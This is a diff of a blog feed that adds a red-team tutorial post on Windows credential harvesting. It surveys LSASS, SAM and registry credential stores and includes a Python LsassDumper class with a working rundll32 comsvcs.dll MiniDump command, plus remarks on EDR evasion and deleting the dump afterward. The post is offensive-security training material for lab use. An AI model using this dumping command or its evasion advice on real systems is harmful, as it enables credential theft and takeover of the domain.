@@ -3,12 +3,288 @@
     <title>Maxwell Cross</title>
     <link href="https://maxwell-cross.com/feed.xml" rel="self" />
     <link href="https://maxwell-cross.com" />
-    <updated>2026-01-17T17:23:59-05:00</updated>
+    <updated>2026-01-17T17:38:15-05:00</updated>
     <author>
         <name>Maxwell Cross</name>
     </author>
     <id>https://maxwell-cross.com</id>
 
+    <entry>
+        <title>30 Days of Red Team: Day 15 — Credential Harvesting</title>
+        <author>
+            <name>Maxwell Cross</name>
+        </author>
+        <link href="https://maxwell-cross.com/30-days-of-red-team-day-15-credential-harvesting.html"/>
+        <id>https://maxwell-cross.com/30-days-of-red-team-day-15-credential-harvesting.html</id>
+        <media:content url="https://maxwell-cross.com/media/posts/4/Adobe-Express-file1.png" medium="image" />
+
+        <updated>2026-01-17T17:38:15-05:00</updated>
+            <summary type="html">
+                <![CDATA[
+                        <img src="https://maxwell-cross.com/media/posts/4/Adobe-Express-file1.png" alt="" />
+                    The Keys to the Kingdom You’ve compromised the initial target. You’ve established persistence. You’ve built resilient C2 infrastructure. You’ve integrated everything into complete operational workflows. You have access, you have control, you have infrastructure. But you’re still just one user on one system. Now comes&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://maxwell-cross.com/media/posts/4/Adobe-Express-file1.png" class="type:primaryImage" alt="" /></p>
+                <h2 id="2143" class="adg adh wg as adi mk aeq ml mo mp aer mq mt mu aes mv my mz aet na nd ne aeu nf ni ado co" data-selectable-paragraph="">The Keys to the Kingdom</h2>
+<p id="360a" class="pw-post-body-paragraph acb acc wg acd b wp adp acf acg wr adq aci acj uu adr acl acm ux ads aco acp va adt acr acs act ky co" data-selectable-paragraph="">You’ve compromised the initial target. You’ve established persistence. You’ve built resilient C2 infrastructure. You’ve integrated everything into complete operational workflows. You have access, you have control, you have infrastructure.</p>
+<p id="9c7f" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph="">But you’re still just one user on one system.</p>
+<p id="e13d" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">Now comes the moment that changes everything: harvesting credentials.</strong></p>
+<p id="fdc2" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph="">This is where engagements explode. This is where a single compromised workstation becomes domain admin. This is where one user’s password becomes the entire network. Because here’s the truth that separates amateurs from professionals:</p>
+<p id="7413" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">In Windows environments, credentials are everywhere. You just have to know where to look.</strong></p>
+<p id="cc23" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph="">Real attackers don’t waste time with privilege escalation exploits when they can simply steal the credentials of someone who already has privileges. They don’t brute force accounts when they can dump LSASS and extract plaintext passwords. They don’t guess at domain admin passwords when they can pull them directly from memory.</p>
+<p id="8ae6" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">This is credential theft at scale. This is how attackers own entire domains in hours.</strong></p>
+<p id="e402" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph="">Today, you’re learning the art of credential harvesting. By the end of this day, you’ll understand:</p>
+<ul class="">
+<li id="0a09" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph=""><strong class="acd he">LSASS dumping strategies</strong> — Multiple techniques to extract credentials from memory</li>
+<li id="53b0" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph=""><strong class="acd he">SAM/SYSTEM extraction</strong> — Offline password hash harvesting</li>
+<li id="099d" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph=""><strong class="acd he">Registry credential mining</strong> — Cached credentials, LSA secrets, saved passwords</li>
+<li id="2350" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph=""><strong class="acd he">DPAPI decryption</strong> — Browser passwords, WiFi keys, RDP credentials</li>
+<li id="326b" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph=""><strong class="acd he">Credential consolidation</strong> — Merging sources to find password reuse patterns</li>
+<li id="0ca1" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph=""><strong class="acd he">Anti-detection techniques</strong> — Evading AV/EDR while harvesting</li>
+<li id="cec3" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph=""><strong class="acd he">Automated collection</strong> — Systematic credential gathering at scale</li>
+</ul>
+<p id="646c" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph="">This isn’t about cracking passwords. This is about stealing them directly from Windows’ own credential storage mechanisms. This is surgical, efficient, and devastatingly effective.</p>
+<p id="1a36" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph="">Let’s get every password on this domain.</p>
+<hr>
+<div class="ky wb wc wd we">
+<div class="o q">
+<div class="eb n ec ed ee ef">
+<h2 id="aa87" class="adg adh wg as adi mk adj ml mo mp adk mq mt mu adl mv my mz adm na nd ne adn nf ni ado co" data-selectable-paragraph="">What You Should Have From Days 1–14</h2>
+<p id="987e" class="pw-post-body-paragraph acb acc wg acd b wp adp acf acg wr adq aci acj uu adr acl acm ux ads aco acp va adt acr acs act ky co" data-selectable-paragraph="">Before harvesting credentials, verify you have:</p>
+<p id="6ffb" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><a class="bj kp" rel="noopener" href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-14-week-2-integration-lab-f5b1d39d8942" data-discover="true"><strong class="acd he">From Week 2 Integration (Day 14)</strong></a><strong class="acd he">:</strong></p>
+<ul class="">
+<li id="471a" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">✅ Complete operational workflow understanding</li>
+<li id="594f" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">✅ Integrated toolkit from all Week 2 days</li>
+<li id="9c43" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">✅ Red team lab environment</li>
+<li id="abcb" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">✅ Experience with end-to-end operations</li>
+</ul>
+<p id="5d5e" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><a class="bj kp" rel="noopener" href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-13-operational-security-anti-forensics-728df45a09e6" data-discover="true"><strong class="acd he">From Day 13 (Anti-Forensics)</strong></a><strong class="acd he">:</strong></p>
+<ul class="">
+<li id="1167" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">✅ Log manipulation capabilities</li>
+<li id="9adb" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">✅ Timestamp stomping tools</li>
+<li id="ffdc" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">✅ Secure deletion utilities</li>
+</ul>
+<p id="0a4a" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">From Days </strong><a class="bj kp" rel="noopener" href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-10-building-custom-c2-infrastructure-your-lifeline-to-compromised-a2fae44f41a0" data-discover="true"><strong class="acd he">10</strong></a><strong class="acd he">–</strong><a class="bj kp" rel="noopener" href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-11-c2-communication-channels-when-your-primary-lifeline-gets-cut-1f368c53555e" data-discover="true"><strong class="acd he">11</strong></a><strong class="acd he"> (C2):</strong></p>
+<ul class="">
+<li id="c127" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">✅ Reliable C2 channels</li>
+<li id="67f6" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">✅ File upload/download capabilities</li>
+<li id="6be4" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">✅ Command execution</li>
+</ul>
+<p id="dd4b" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">From Days </strong><a class="bj kp" rel="noopener" href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-8-windows-persistence-mechanisms-bee31a6ba75d" data-discover="true"><strong class="acd he">8</strong></a><strong class="acd he">–</strong><a class="bj kp" rel="noopener" href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-9-linux-persistence-techniques-surviving-in-unix-territory-d654252c61c5" data-discover="true"><strong class="acd he">9</strong></a><strong class="acd he"> (Persistence):</strong></p>
+<ul class="">
+<li id="bd55" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">✅ Stable access to target systems</li>
+<li id="1187" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">✅ Multiple persistence mechanisms</li>
+<li id="9ffd" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">✅ <strong class="acd he">Admin/SYSTEM level access</strong> (CRITICAL for credential dumping)</li>
+</ul>
+<p id="f362" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">Technical Requirements:</strong></p>
+<ul class="">
+<li id="268d" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">Python 3.8+ with <code class="dh adu adv adw adx b">pypykatz</code>, <code class="dh adu adv adw adx b">impacket</code></li>
+<li id="a3ce" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">PowerShell 5.0+ (for Windows operations)</li>
+<li id="6886" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Admin/SYSTEM privileges on target Windows systems</li>
+<li id="6ddb" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Understanding of Windows authentication architecture</li>
+<li id="3457" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Test lab environment (critical — never test on production)</li>
+</ul>
+<p id="0d96" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">CRITICAL:</strong> Most credential harvesting requires <strong class="acd he">local administrator</strong> or <strong class="acd he">SYSTEM</strong> privileges. If you don’t have elevated access, revisit privilege escalation techniques from earlier days.</p>
+<hr>
+<h2 id="ae9d" class="adg adh wg as adi mk adj ml mo mp adk mq mt mu adl mv my mz adm na nd ne adn nf ni ado co" data-selectable-paragraph="">The Credential Harvesting Mindset</h2>
+<p id="f5c6" class="pw-post-body-paragraph acb acc wg acd b wp adp acf acg wr adq aci acj uu adr acl acm ux ads aco acp va adt acr acs act ky co" data-selectable-paragraph="">Let me tell you what happens in real engagements:</p>
+<p id="7f6d" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph="">An amateur operator compromises a workstation. They get a shell as a regular user. They think: “I need to find an exploit to escalate privileges.” So they run exploit scanners, search for CVEs, try kernel exploits. Hours wasted.</p>
+<p id="11b2" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">The professional operator thinks differently:</strong></p>
+<p id="cae3" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph="">“This user logged in at some point. Windows cached their credentials. LSASS has their password in memory. The registry has saved credentials from RDP sessions. The browser has stored domain passwords. I don’t need exploits — I need to harvest what’s already here.”</p>
+<p id="8702" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph="">They dump LSASS. Extract 37 sets of credentials. 12 of them are domain admins who logged into this machine yesterday for maintenance. <strong class="acd he">Game over in 5 minutes.</strong></p>
+<h3 id="df02" class="ady adh wg as adi uq adz ur mo us aea ut mt uu aeb uv uw ux aec uy uz va aed vb vc aee co" data-selectable-paragraph="">The Philosophy</h3>
+<pre class="language-markdown"><code>Exploits are loud and unreliable
+Credential theft is silent and guaranteed
+Every Windows system is a credential vault
+You're not stealing passwords—you're harvesting what users gave Windows</code></pre>
+<p><strong class="acd he">Real-World Credential Harvesting:</strong></p>
+<table style="border-collapse: collapse; width: 122.507%;" border="1">
+<tbody>
+<tr>
+<td style="width: 26.5425%;"><strong>Target System</strong></td>
+<td style="width: 21.8859%;"><strong>Access Level</strong></td>
+<td style="width: 27.241%;"><strong>Harvesting Method</strong> </td>
+<td style="width: 24.3306%;"><strong>Typical Result</strong></td>
+</tr>
+<tr>
+<td style="width: 26.5425%;">Workstation</td>
+<td style="width: 21.8859%;">Local Admin</td>
+<td style="width: 27.241%;">LSASS dump</td>
+<td style="width: 24.3306%;">5–15 credentials (domain users)</td>
+</tr>
+<tr>
+<td style="width: 26.5425%;">File Server</td>
+<td style="width: 21.8859%;">SYSTEM </td>
+<td style="width: 27.241%;">LSASS + LSA Secrets</td>
+<td style="width: 24.3306%;">20–50 credentials (service accounts, admins)</td>
+</tr>
+<tr>
+<td style="width: 26.5425%;">Domain Controller</td>
+<td style="width: 21.8859%;">Admin</td>
+<td style="width: 27.241%;">DCSync attack</td>
+<td style="width: 24.3306%;">ALL domain password hashes</td>
+</tr>
+<tr>
+<td style="width: 26.5425%;">Jump Box</td>
+<td style="width: 21.8859%;">Admin</td>
+<td style="width: 27.241%;">Cached RDP credentials</td>
+<td style="width: 24.3306%;">High-privilege admin credentials</td>
+</tr>
+</tbody>
+</table>
+<p><strong class="acd he">Key Insight:</strong> Windows systems are designed to store credentials for legitimate purposes. As an attacker, you’re simply accessing what’s already there.</p>
+<hr>
+<h2 id="957b" class="adg adh wg as adi mk adj ml mo mp adk mq mt mu adl mv my mz adm na nd ne adn nf ni ado co" data-selectable-paragraph="">Understanding Windows Credential Storage</h2>
+<p id="2848" class="pw-post-body-paragraph acb acc wg acd b wp adp acf acg wr adq aci acj uu adr acl acm ux ads aco acp va adt acr acs act ky co" data-selectable-paragraph="">Before you can harvest credentials, understand where Windows stores them.</p>
+<h3 id="d681" class="ady adh wg as adi uq adz ur mo us aea ut mt uu aeb uv uw ux aec uy uz va aed vb vc aee co" data-selectable-paragraph="">LSASS (Local Security Authority Subsystem Service)</h3>
+<p id="c2ea" class="pw-post-body-paragraph acb acc wg acd b wp adp acf acg wr adq aci acj uu adr acl acm ux ads aco acp va adt acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">What it is:</strong></p>
+<ul class="">
+<li id="33f4" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">Core Windows process (<code class="dh adu adv adw adx b">lsass.exe</code>)</li>
+<li id="5373" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Manages authentication for the system</li>
+<li id="8657" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Stores credentials in memory for single sign-on</li>
+<li id="14d7" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Runs with SYSTEM privileges</li>
+</ul>
+<p id="2659" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">What it contains:</strong></p>
+<ul class="">
+<li id="bea7" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">Plaintext passwords (older systems or WDigest enabled)</li>
+<li id="759b" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">NTLM hashes (NT and LM hashes)</li>
+<li id="edd7" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Kerberos tickets (TGTs and service tickets)</li>
+<li id="29c7" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Cached domain credentials</li>
+</ul>
+<p id="0da1" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">Why attackers target it:</strong></p>
+<ul class="">
+<li id="9568" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">One dump = all active credentials</li>
+<li id="8a2a" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Includes anyone who logged in since last reboot</li>
+<li id="a67d" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Often contains domain admin credentials</li>
+<li id="36d9" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Accessible with admin/SYSTEM privileges</li>
+</ul>
+<p id="4b7a" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">Protection mechanisms to be aware of:</strong></p>
+<ul class="">
+<li id="11c8" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">Credential Guard (Windows 10/Server 2016+)</li>
+<li id="28e8" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">RunAsPPL (Protected Process Light)</li>
+<li id="37cc" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">EDR monitoring of LSASS access</li>
+<li id="d122" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Signature-based detection of dumping tools</li>
+</ul>
+<h3 id="fbcd" class="ady adh wg as adi uq adz ur mo us aea ut mt uu aeb uv uw ux aec uy uz va aed vb vc aee co" data-selectable-paragraph="">SAM (Security Accounts Manager)</h3>
+<p id="c1a0" class="pw-post-body-paragraph acb acc wg acd b wp adp acf acg wr adq aci acj uu adr acl acm ux ads aco acp va adt acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">What it is:</strong></p>
+<ul class="">
+<li id="a746" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">Database storing local user credentials</li>
+<li id="1acf" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Located at: <code class="dh adu adv adw adx b">C:\Windows\System32\config\SAM</code></li>
+<li id="a0d5" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Encrypted with SYSKEY (stored in SYSTEM hive)</li>
+</ul>
+<p id="bdf9" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">What it contains:</strong></p>
+<ul class="">
+<li id="ab61" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">Local user password hashes</li>
+<li id="6439" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Account metadata (RID, groups)</li>
+<li id="c91d" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">No domain credentials (only local accounts)</li>
+</ul>
+<p id="f2d9" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">Why attackers target it:</strong></p>
+<ul class="">
+<li id="3f90" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">Local admin hashes for lateral movement</li>
+<li id="8e8a" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Often same local admin password across many systems</li>
+<li id="802a" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Can be extracted offline</li>
+<li id="f8b5" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Hashes can be cracked or used in pass-the-hash</li>
+</ul>
+<h3 id="0839" class="ady adh wg as adi uq adz ur mo us aea ut mt uu aeb uv uw ux aec uy uz va aed vb vc aee co" data-selectable-paragraph="">Registry Credentials</h3>
+<p id="b81c" class="pw-post-body-paragraph acb acc wg acd b wp adp acf acg wr adq aci acj uu adr acl acm ux ads aco acp va adt acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">Common locations:</strong></p>
+<ul class="">
+<li id="ca21" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph=""><code class="dh adu adv adw adx b">HKLM\Security\Policy\Secrets</code> - LSA Secrets</li>
+<li id="c40b" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph=""><code class="dh adu adv adw adx b">HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code> - AutoLogon</li>
+<li id="3ac7" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph=""><code class="dh adu adv adw adx b">HKCU\Software\Microsoft\Terminal Server\Client\Servers</code> - RDP saved connections</li>
+<li id="676a" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Various DPAPI-protected locations</li>
+</ul>
+<p id="bda0" class="pw-post-body-paragraph acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act ky co" data-selectable-paragraph=""><strong class="acd he">What they contain:</strong></p>
+<ul class="">
+<li id="721d" class="acb acc wg acd b wp ace acf acg wr ach aci acj uu ack acl acm ux acn aco acp va acq acr acs act acu acv acw co" data-selectable-paragraph="">Service account passwords (in cleartext!)</li>
+<li id="135f" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Scheduled task credentials</li>
+<li id="166b" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">AutoLogon credentials</li>
+<li id="8910" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">VPN/WiFi passwords (DPAPI encrypted)</li>
+<li id="4752" class="acb acc wg acd b wp acx acf acg wr acy aci acj uu acz acl acm ux ada aco acp va adb acr acs act acu acv acw co" data-selectable-paragraph="">Browser saved passwords (DPAPI encrypted)</li>
+</ul>
+<hr>
+<h2 id="5bcd" class="adg adh wg as adi mk adj ml mo mp adk mq mt mu adl mv my mz adm na nd ne adn nf ni ado co" data-selectable-paragraph="">Multi-Method LSASS Dumping Strategy</h2>
+<p id="e3e1" class="pw-post-body-paragraph acb acc wg acd b wp adp acf acg wr adq aci acj uu adr acl acm ux ads aco acp va adt acr acs act ky co" data-selectable-paragraph="">Professional credential harvesting uses multiple techniques because different environments require different approaches.</p>
+<h3 id="818c" class="ady adh wg as adi uq adz ur mo us aea ut mt uu aeb uv uw ux aec uy uz va aed vb vc aee co" data-selectable-paragraph="">The Professional Approach to LSASS Dumping</h3>
+<pre class="language-python"><code>class LsassDumper:
+    """Professional LSASS credential harvesting"""
+    
+    def __init__(self):
+        # Multiple methods for different scenarios
+        self.methods = {
+            'comsvcs': self.dump_via_comsvcs,      # Stealthiest, uses Windows DLL
+            'procdump': self.dump_via_procdump,    # If Sysinternals available
+            'powershell': self.dump_via_powershell, # Memory-based
+            'direct_syscalls': self.dump_via_syscalls # EDR bypass
+        }
+    
+    def dump_credentials(self, method='auto'):
+        """
+        Professional credential harvesting workflow
+        """
+        # Step 1: Check privileges (CRITICAL)
+        if not self.check_admin_access():
+            print("[-] Admin/SYSTEM required for LSASS dump")
+            return None
+        
+        # Step 2: Check for protections
+        protections = self.check_lsass_protections()
+        if protections['credential_guard']:
+            print("[!] Credential Guard enabled - LSASS dump will fail")
+            return self.use_alternative_methods()
+        
+        if protections['ppl_enabled']:
+            print("[!] LSASS running as PPL - need driver bypass")
+            return self.bypass_ppl_or_use_alternatives()
+        
+        # Step 3: Select best method for environment
+        if method == 'auto':
+            method = self.select_best_method(protections)
+        
+        # Step 4: Execute dump
+        dump_file = self.methods[method]()
+        
+        # Step 5: Parse credentials from dump
+        credentials = self.parse_dump_file(dump_file)
+        
+        # Step 6: IMMEDIATELY secure delete dump file
+        self.secure_delete(dump_file)
+        
+        return credentials
+    
+    def dump_via_comsvcs(self):
+        """
+        Stealthiest method - uses Windows built-in DLL
+        
+        This is the professional's choice because:
+        - comsvcs.dll is signed by Microsoft
+        - Already present on all Windows systems
+        - Rarely flagged by AV/EDR
+        - No external tools needed
+        """
+        lsass_pid = self.get_lsass_pid()
+        dump_path = f"C:\\Windows\\Temp\\.{random_name()}.tmp"
+        
+        # Use rundll32 to call MiniDumpW from comsvcs.dll
+        cmd = f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump {lsass_pid} {dump_path} full"
+        
+        result = self.execute_command(cmd)
+        
+        if result.success:
+            print(f"[+] LSASS dumped via comsvcs: {dump_path}")
+            return dump_path
+        else:
+            print(f"[-] comsvcs dump failed")
+            return None</code></pre>
+<p><strong><a href="https://medium.com/30-days-of-red-team/30-days-of-red-team-day-15-credential-harvesting-829737ccc5e6" target="_blank" rel="noopener noreferrer">Read The Full Article On Medium</a></strong></p>
+</div>
+</div>
+</div>
+            ]]>
+        </content>
+    </entry>
     <entry>
